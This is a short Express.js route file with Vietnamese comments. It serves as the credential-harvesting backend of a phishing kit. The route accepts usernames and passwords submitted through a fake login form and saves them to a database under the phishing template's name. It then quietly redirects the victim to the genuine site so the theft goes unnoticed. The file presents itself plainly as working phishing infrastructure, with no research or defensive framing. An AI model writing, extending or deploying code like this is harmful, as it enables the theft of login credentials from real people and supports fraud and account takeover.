const router = require('express').Router();
const { Link, Credential } = require('../models');

// Route này chỉ để nhận dữ liệu từ form giả mạo
router.post('/submit/:shortId', async (req, res) => {
    let targetUrl = "https://www.google.com"; // URL mặc định nếu có lỗi
    try {
        const { shortId } = req.params;
        const { username, password, visit_id } = req.body;

        // Cố gắng lấy targetUrl sớm nhất có thể
        const link = await Link.findOne({ where: { shortId } });
        if (link) {
            targetUrl = link.targetUrl;
        }

        // Validate
        if (!shortId || !username || !password || !visit_id) {
            console.warn("Dữ liệu submit form giả mạo không đầy đủ.");
            return res.redirect(targetUrl);
        }

        // Lưu thông tin đăng nhập vào CSDL
        await Credential.create({
            service: link ? link.phishTemplate : 'unknown',
            username: username,
            password: password,
            visitId: visit_id
        });
        
        // Chuyển hướng nạn nhân đến trang đích
        res.redirect(targetUrl);

    } catch (error) {
        console.error("Lỗi nghiêm trọng khi xử lý submit giả mạo:", error);
        res.redirect(targetUrl); // Luôn chuyển hướng để che giấu lỗi
    }
});

module.exports = router;
